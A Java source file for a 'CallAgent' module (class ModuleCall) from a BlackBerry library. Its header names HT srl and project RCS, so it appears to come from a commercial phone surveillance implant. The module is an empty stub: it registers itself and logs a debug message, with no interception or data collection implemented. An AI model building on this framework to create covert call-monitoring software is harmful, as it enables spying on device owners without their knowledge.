//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallAgent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.module;

import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;


/**
 * The Class CallAgent.
 */
public final class ModuleCall extends BaseModule {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallAgent", DebugLevel.VERBOSE);
    //#endif

    /**
     * Instantiates a new call agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ModuleCall(final boolean agentStatus) {
        super(BaseModule.AGENT_CALL, agentStatus, true, "CallAgent");
    }

    /**
     * Instantiates a new call agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected ModuleCall(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualGo() {
        //#ifdef DEBUG
        debug.trace("run");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {

        return false;
    }

}
